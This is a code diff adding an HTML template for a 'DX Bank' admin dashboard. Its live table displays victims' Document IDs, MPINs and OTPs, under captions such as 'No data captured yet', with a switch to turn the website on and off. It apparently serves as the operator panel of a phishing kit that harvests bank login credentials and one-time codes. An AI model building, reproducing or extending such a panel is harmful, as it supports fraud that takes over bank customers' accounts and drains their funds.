@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DX Bank - Admin Dashboard</title>
+    <!-- Icons: Remix Icon via CDN -->
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.1.0/fonts/remixicon.css" rel="stylesheet">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}?v=6">
+</head>
+<body class="admin-body">
+
+    <!-- ==================== HEADER ==================== -->
+    <header class="admin-header">
+        <div class="header-left">
+            <div class="header-logo">
+                <i class="ri-shield-check-fill"></i>
+            </div>
+            <div class="header-text">
+                <h1>Admin Dashboard</h1>
+                <p>DX Bank · Real-time Monitoring</p>
+            </div>
+        </div>
+        <div class="admin-controls">
+            <button id="websiteToggleBtn" onclick="toggleWebsite()" class="btn-toggle btn-website on">
+                <i class="ri-global-line"></i>
+                <span id="websiteToggleText">Website ON</span>
+            </button>
+            <button id="soundBtn" onclick="toggleSound()" class="btn-toggle btn-sound off">
+                <i class="ri-volume-mute-line" id="soundIcon"></i>
+                <span id="soundText">Sound OFF</span>
+            </button>
+            <a href="/admin/logout" class="btn-logout">
+                <i class="ri-logout-box-r-line"></i> Logout
+            </a>
+        </div>
+    </header>
+
+    <!-- ==================== MAIN CONTENT ==================== -->
+    <main class="admin-content">
+
+        <!-- Overview Section -->
+        <div class="section-header">
+            <div class="section-title-wrap">
+                <div class="section-icon icon-cyan"><i class="ri-dashboard-3-line"></i></div>
+                <div>
+                    <h2>Overview</h2>
+                    <p>Live statistics at a glance</p>
+                </div>
+            </div>
+            <div class="section-badge">Live Updates</div>
+        </div>
+
+        <!-- Stats Cards -->
+        <div class="stats-grid">
+            <div class="stat-card card-cyan">
+                <div class="card-icon-wrap">
+                    <i class="ri-group-fill"></i>
+                </div>
+                <div class="card-info">
+                    <p>Total Users</p>
+                    <h3 id="totalUsers">0</h3>
+                </div>
+            </div>
+
+            <div class="stat-card card-green">
+                <div class="card-icon-wrap">
+                    <i class="ri-checkbox-circle-fill"></i>
+                </div>
+                <div class="card-info">
+                    <p>Completed</p>
+                    <h3 id="completedLogins">0</h3>
+                </div>
+            </div>
+
+            <div class="stat-card card-amber">
+                <div class="card-icon-wrap">
+                    <i class="ri-time-fill"></i>
+                </div>
+                <div class="card-info">
+                    <p>Pending</p>
+                    <h3 id="pendingCount">0</h3>
+                </div>
+            </div>
+        </div>
+
+        <!-- Warning Box -->
+        <div class="warning-box">
+            <div class="warning-icon">
+                <i class="ri-alert-fill"></i>
+            </div>
+            <div class="warning-text">
+                <strong>Security Notice:</strong> Users will be <strong>blocked after 5 failed attempts</strong> on the same Document ID.
+            </div>
+        </div>
+
+        <!-- Data Feed Section -->
+        <div class="section-header">
+            <div class="section-title-wrap">
+                <div class="section-icon icon-purple"><i class="ri-database-2-line"></i></div>
+                <div>
+                    <h2>Real-time Data Feed</h2>
+                    <p>User activity log</p>
+                </div>
+            </div>
+            <div class="live-badge">
+                <span class="live-dot"></span> LIVE
+            </div>
+        </div>
+
+        <!-- Data Table Container -->
+        <div class="table-container">
+            
+            <!-- Table Header with Filter Buttons -->
+            <div class="table-header">
+                <div class="table-header-title">
+                    <i class="ri-file-list-3-line"></i>
+                    <h3>User Activity Log</h3>
+                </div>
+                <button onclick="clearAllRecords()" class="btn-clear">
+                    <i class="ri-delete-bin-6-line"></i> Clear All
+                </button>
+            </div>
+
+            <!-- Filter Buttons -->
+            <div class="filter-bar">
+                <button class="filter-btn active" data-filter="all" onclick="filterTable('all', this)">
+                    <i class="ri-list-check"></i> All
+                </button>
+                <button class="filter-btn" data-filter="id" onclick="filterTable('id', this)">
+                    <i class="ri-file-user-line"></i> Document ID
+                </button>
+                <button class="filter-btn" data-filter="mpin" onclick="filterTable('mpin', this)">
+                    <i class="ri-lock-password-line"></i> MPIN
+                </button>
+                <button class="filter-btn" data-filter="otp" onclick="filterTable('otp', this)">
+                    <i class="ri-shield-keyhole-line"></i> OTP
+                </button>
+                <button class="filter-btn" data-filter="completed" onclick="filterTable('completed', this)">
+                    <i class="ri-check-double-line"></i> Completed
+                </button>
+            </div>
+
+            <!-- Table -->
+            <div class="table-scroll">
+                <table>
+                    <thead>
+                        <tr>
+                            <th><i class="ri-time-line"></i> Time (PKT)</th>
+                            <th><i class="ri-id-card-line"></i> Document ID</th>
+                            <th><i class="ri-lock-line"></i> MPIN</th>
+                            <th><i class="ri-shield-keyhole-line"></i> OTP</th>
+                            <th><i class="ri-flag-line"></i> Status</th>
+                            <th><i class="ri-settings-3-line"></i> Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="dataTableBody"></tbody>
+                </table>
+            </div>
+
+            <div id="emptyState" class="empty-state">
+                <div class="empty-icon">
+                    <i class="ri-inbox-archive-line"></i>
+                </div>
+                <p>No data captured yet</p>
+                <span>Waiting for user activity...</span>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="admin-footer">
+        <p>© DX Bank · Digital Kidu Dashboard · All rights reserved</p>
+    </footer>
+
+    <script src="{{ url_for('static', filename='js/admin_v4.js') }}?v=7"></script>
+</body>
+</html>
